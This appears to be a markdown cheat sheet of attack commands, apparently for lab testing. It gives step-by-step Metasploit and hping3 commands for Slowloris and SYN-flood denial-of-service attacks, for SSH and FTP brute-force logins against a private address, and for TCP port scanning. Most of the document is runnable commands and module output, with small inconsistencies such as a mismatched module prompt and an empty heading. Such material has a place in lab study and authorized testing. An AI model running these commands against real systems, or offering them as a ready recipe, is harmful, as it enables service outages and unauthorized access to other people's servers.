### ATTACK SCRIPT FOR TESTING

## DDoS & DoS Attacks and Bot Attacks

# 1. Slowloris

Using Metasploit

```shell
msfconsole
msf6 > use auxiliary/dos/http/slowloris
msf6 auxiliary(dos/http/slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

Name             Current Setting  Required  Description
----             ---------------  --------  -----------
delay            15               yes       The delay between sending ke
                                            ep-alive headers
rand_user_agent  true             yes       Randomizes user-agent with e
                                            ach request
rhost                             yes       The target address
rport            80               yes       The target port
sockets          150              yes       The number of sockets to use
                                                in the attack
ssl              false            yes       Negotiate SSL/TLS for outgoi
                                            ng connections


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/http/slowloris) > set rhost <VICTIM IP>
rhost => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > set rport <SERVER RUNNING PORT>
rport => <SERVER RUNNING PORT>
msf6 auxiliary(dos/http/slowloris) > run
```

Using hping ( custom packet/attack gegenrator)

- `sudo hping3 -S -p 80 -i u100000 <TARGET-IP>`

# 2. Syn Flood
```shell
msfconsole
msf6 auxiliary(dos/http/slowloris) > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > show options

Module options (auxiliary/dos/tcp/synflood):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
INTERFACE                   no        The name of the interface
NUM                         no        Number of SYNs to send (else unlim
                                        ited)
RHOSTS                      yes       The target host(s), see https://do
                                        cs.metasploit.com/docs/using-metas
                                        ploit/basics/using-metasploit.html
RPORT      80               yes       The target port
SHOST                       no        The spoofable source address (else
                                        randomizes)
SNAPLEN    65535            yes       The number of bytes to capture
SPORT                       no        The source port (else randomizes)
TIMEOUT    500              yes       The number of seconds to wait for
                                                new data


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/tcp/synflood) > set RHOSTS <VICTIM IP>
RHOSTS => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > run

```
# 3. 

## SSH Patator

# SSH BRUTE FORCE
## SSH Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS 192.168.1.2
run
```

---

## FTP Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ftp/ftp_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS 192.168.1.2
run
```

## Port Scanning 

# TCP / SYN Port Scan

    Using Metasploit

```shell
    msfconsole
    msf6> use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <VICTIM-IP>
    msf6 auxiliary(scanner/portscan/tcp) > run
``` 

